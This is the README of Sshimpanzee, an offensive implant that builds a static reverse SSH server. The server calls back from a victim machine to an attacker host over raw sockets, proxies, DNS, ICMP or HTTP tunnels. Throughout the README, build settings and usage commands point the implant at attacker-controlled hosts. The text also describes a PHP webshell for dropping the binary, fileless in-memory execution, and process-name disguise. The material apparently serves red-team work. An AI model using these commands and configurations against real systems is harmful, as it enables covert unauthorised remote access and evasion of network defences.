# Sshimpanzee
__Sshimpanzee__ allows you to build a __static *reverse* ssh server__.
Instead of listening on a port and waiting for connections, the ssh server will initiate a reverse connect to attacker's ip, just like a regular reverse shell.
__Sshimpanzee__ allows you to take advantage of __every features of a regular ssh__ connection, like __port forwards, dynamic socks proxies, or FTP server__.

More importantly, if a direct connection from the victim machine to the attacker server is not possible, it provides different tunnelling mecanisms such as __DNS Tunnelling, ICMP Tunnelling, or HTTP Encapsulation__.
It also supports HTTP and SOCKS5 proxies.
A [technical paper](https://blog.lexfo.fr/sshimpanzee.html) is available on lexfo's blog.

## DOCKER BUILD - RECOMMENDED

```
sudo docker build . --output . 
sudo docker build . --platform arm64 --output . 
```

> You might need to enable env var DOCKER_BUILDKIT=1 

### Compilation file

Build is made based on the build.yaml file: 

```yaml

###
# This is sshimpanzee build configuration file
# YAML is used to describe what behaviour and feature should the sshimpanzee get
###

### General config

process_name: "sshimpanzee" # Name of the process as it appears in ps (yet you won't be able to kill it with this name)


banner: True # Should the banner be displayed at log
verbose: 3 # Verbosity level as written in build/build.log

shell: "/bin/sh" # Default shell to pop for user, bypassing /etc/passwd entries with false or nologin as shell
timer: 60*1000*1000  # Time in milliseconds before a new sshimpanzee child is forked after exiting. For example in sock MODE, a new sshd connection will be made 1 minute after the previous one is dead

keygen: True # Re generate keys during build, insure a new HOST and CLIENT keys is used
public_key: #if new keys are not regenerated it is possible to specify a public client key to authenticate (only ed25519 keys are supported)
#public key: "ssh-ed25519 .... ROGUE@ROGUE"

make: True # Keep it to true if you want the builder script to generate sshd binary
force_clean_build: True #Currently required for docker builds, will force builder script to recompile tunnels and dependances
reconf: True # Required for docker builds


### Environment
# sshimpanzee is configured at runtime through environment variables, yet, it is possible to preset environment variable, to get a default behavior


env:
  if_not_set : # Variable here will be set if they do not already exists
    REMOTE: 127.0.0.1
    PORT: 8080
    MODE: sock # MODE environment variable is used to manage the default tunnel
  overwrite: # Variable here will overwrite already existent 
    

### Tunnels
# sshimpanzee come with different tunneling mecanisms
# To speed up compilation time, and more importantly to get a lighter binary it is possible to include or exclude some tunnels
# Tunnel compilation parameters can be specified here 
tun:
  sock:
      enabled: True

  icmp:
      enabled: True
      buildserv: True # should the corresponding ICMPTunnel server be built 
      raw_sock: False # build with support for raw sock for older kernels

  http_enc :
      enabled: True
      key: # web shell key, empty will result in a new key being generated
      target:
        - "php" # list of language you want to generate webshells for 
      path_fd: "/dev/shm/sshim" # Fifo that sshimpanzee will use to communicate with webshells

  dns:
      enabled: True    
      resource: sshimpanzee # DNS2TCP Resource
      key: sshimpanzee # DNS2TCP key
      obfuscate: True # obfuscating DNS2TCP Magic string, this will force the build of the corresponding srver
      buildserv: False 
      qtype: TXT # Type of query used by DNS2TCP

  proxysock:
      enabled: True

  no_build:
      enabled: False 
      path: []

# Openssh subsystems
# man sshd_config Subsystems

subsystems:

  internal_sftp: # standard sftp as provided by openssh 
    enabled: True # It is required for scp and sftp
    name: sftp
    exec: internal-sftp
    is_internal: True
    
  remote_exec: # Sshimpanzee custom subsystem
    enabled: True # remote execution using fileless memfd technique
    name: remote-exec
    exec: internal-remote-exec
    is_internal: True

  python: # example of a stadard ssh subsystem
    enabled: False
    name: python
    exec: /usr/bin/python -c "print('python code')"
    is_internal: False
```


## Usage 

At runtime, sshimpanzee binary is configured through environment variable.
The `MODE` variable allows user to select between compiled tunnels. 
Every tunnels can be configured through environment variables. 
For example, to get a classic reverse connect to 127.0.0.1:8080 use the following:
```
MODE=socks REMOTE=127.0.0.1 PORT=8080 ./sshimpanzee
```

> It is possible to run sshimpanzee in debug mode with -d.
> In debug mode sshimpanzee will stay in foreground.

### Tunnels 

Currently sshimpanzee support several ways for the implant to reach out to the attacker ssh client:  
- DNS Tunnelling using dns2tcp protocol   
- Proxy :  HTTP/SOCKS4/SOCKS5   
- Sockets : (might be usefull if you want to implement your own tunnels)   
- ICMP tunnel   
- HTTP Encapsulation

### Sock Connection

1) Run ssh on client side as follow:

``` 
ssh anyrandomname@127.0.0.1 -oProxyCommand="nc -lp 8080" -i CLIENT
```


2) Run sshimpanzee on target :
```
MODE=sock REMOTE=127.0.0.1 PORT=8080 ./sshimpanzee 
```

Other examples :
```
MODE=sock REMOTE=127.0.0.1 PORT=8080 SSHIM_LISTEN= ./sshimpanzee  # bind and listen to 127.0.0.1:8080

MODE=sock UNIXPATH=/tmp/sock SSHIM_UNIX ./sshimpanzee # Connect to unix socket /tmp/sock
MODE=sock UNIXPATH=/tmp/sock SSHIM_UNIX= SSHIM_LISTEN= ./sshimpanzee # Bind and listen to /tmp/sock unix socket 
```

### Connection through proxy
1) Run ssh on client side as follow:

``` 
ssh anyrandomname@127.0.0.1 -oProxyCommand="nc -lp 4444" -i CLIENT
```


2) Run sshimpanzee on target :
```
MODE=proxysock REMOTE=attacker.server PORT=4444 http_proxy=socks5://proxy.lan:8080 ./sshimpanzee
```

Other examples:
```
MODE=proxysock REMOTE=attacker.server PORT=4444 http_proxy=http://proxy.lan:8080 ./sshimpanzee
MODE=proxysock REMOTE=attacker.server PROXY_USER=user PROXY_PASS=password PORT=4444 http_proxy=http://proxy.lan:8080 ./sshimpanzee

```



### Use DNS Tunneling

1) On your server run the standard __dns2tcpd__ using the config file in this repo, you will need to modify the domain (and resource port if you want).
```
listen = 0.0.0.0
port = 53
user = nobody
key = sshimpanzee
chroot = /var/empty/dns2tcp/
domain = <SERVER>
resources = sshimpanzee:127.0.0.1:8080
```

```
sudo ./dns2tcpd -F -f dns2tcpdrc
```

2) Run ssh on client side as follow:

``` 
ssh anyrandomname@127.0.0.1 -oProxyCommand="nc -lp 8080" -i CLIENT
```

3) Run the sshimpanzee binary:
```
MODE=dns REMOTE=attacker.controled.domain ./sshimpanzee
```

Other examples :
```
MODE=dns REMOTE=attacker.controled.domain RESOLVER=8.8.8.8 ./sshimpanzee # Force the use of 8.8.8.8 DNS Resolver
```

### Use ICMP Tunneling

1) Your server, add the correct capabilities to avoid running the proxycommand as root and disable ping response from the system
``` 
sudo setcap cap_net_raw+ep icmptunnel
echo 1 | sudo dd of=/proc/sys/net/ipv4/icmp_echo_ignore_all 
```

2) Run the standard ssh client with icmptunnel as proxycommand:
```
ssh i -oProxyCommand=./icmptunnel -i test/CLIENT 
```

3) Run	the sshimpanzee	binary:
```
MODE=icmp REMOTE=127.0.0.1 ./sshimpanzee 
```


### Use HTTP Encapsulation (ssh -> http server -> sshd)

1) Upload the file /tuns/http_enc/proxy.php and sshd files to your target web server

2) Make sure proxy.php is correctly executed 

3) Run sshd binary on the webserver
```
MODE=http_enc ./sshimpanzee 
```

4) run ssh on client machine with python script in utils/scripts/ as proxy command :
```
ssh -o ProxyCommand='python proxy_cli.py http://127.0.0.1:8080/proxy.php EncryptionKey 2>/dev/null' a@a -i ../../keys/CLIENT 
```
> Multiple argument can be passed to  proxy_cli.py to add proxies proxies.
> Currently only PHP is supported. On a JSP server, it is recommended to use: [A Black Path Toward The Sun (ABPTTS)](https://github.com/nccgroup/ABPTTS)


#### Side notes about http Encapsulation
1) Proxy.php is a minimal webshell, you can use it to upload sshd to the server and run commands. proxy_cli.py offers --run and --drop options to do so.

2) You might experience a huge input lag, it is because a delay of 1 to 5 second is added to the packet sent by ssh client to prevent from generating to many http request. If you don't mind generating a lot of http request (thus a lot of logs on the web server) add the --no-buffer option to proxy_cli.py command.

## Using the sshimpanzee client
This repo also provide a client located in __utils/client/bin__.
Simply copy the CLIENT key in utils/client/keys/
```
sshimpanzee --new PORT #create a new listener on PORT
sshimpanzee --new-dns #create a new DNS listener (Don't forget to modify utils/client/config/dnsconf.txt)
sshimpanzee --new-icmp #create a new icmp listener
sshimpanzee --new-http PROXY_PHP_URL #create a new HTTP Session 

sshimpanzee --list #list availaible sessions

sshimpanzee --get SESSION_NUMBER #to jump into a session any extra parameters are passed as ssh params
sshimpanzee --rename SESSION_NUMBER #to rename a session
sshimpanzee --kill SESSION_NUMBER #to kill a session
sshimpanzee #use fzf to select which session you want
```

However it might be less reliable than using ssh directly.

## Create your own tunnel mecanism
Every tunnels are available in the tuns/ directory. If you want to add another tunnel, simply add a function with the name of your tunnel in tuns/builder.py. This function is responsible to generate a libtun.a archive containing as many .o as necessary with one of them exporting a tun() symbole.
Alternatively, you build the libtun.a yourself and use the tunnel called no_build, and provide the path to your custom libtun.a


## Use the file less execution
If sshimpanzee is built with remote-exec subsystem module, it is possible to execute code remotely completely in memory.
```sh

python remote_loader.py "ssh -vvvv t@t -S ./SOCKET -s remote-exec" /home/titouan/tools/Misc/RustScan/target/release/rustscan -a 127.0.0.1
```


## Future Work
- Add other tunnels :
  - HTTP Encapsulation (First step through http_enc and proxy.php : add JSP and other programs ) 
  - Userland TCP/IP Stack with raw sock ?
  - ICMP : Xor/Encrypt string to avoid detection in case of network analysis 
  - Subsystem for post exploitation: 
	- Procdump 
	- TCP Scan
	

## Thanks

This repository relies on a lot of different project. 
- First of all, Openssh-portable (9.1) : https://github.com/openssh/openssh-portable
- The musl libc to build it statically : https://wiki.musl-libc.org/

For the tunnels: 
- Dns2tcp : https://github.com/alex-sector/dns2tcp
- icmptunnel (heavily modified to improve tunnel resiliency) : https://github.com/DhavalKapil/icmptunnel.git
- Proxysocket : https://github.com/brechtsanders/proxysocket


It is important to note that it is *not* a very original project, weaponizing ssh protocol has already been done several years ago:
- https://github.com/Marc-andreLabonte/blackbear 
- https://github.com/Fahrj/reverse-ssh
- https://github.com/NHAS/reverse_ssh


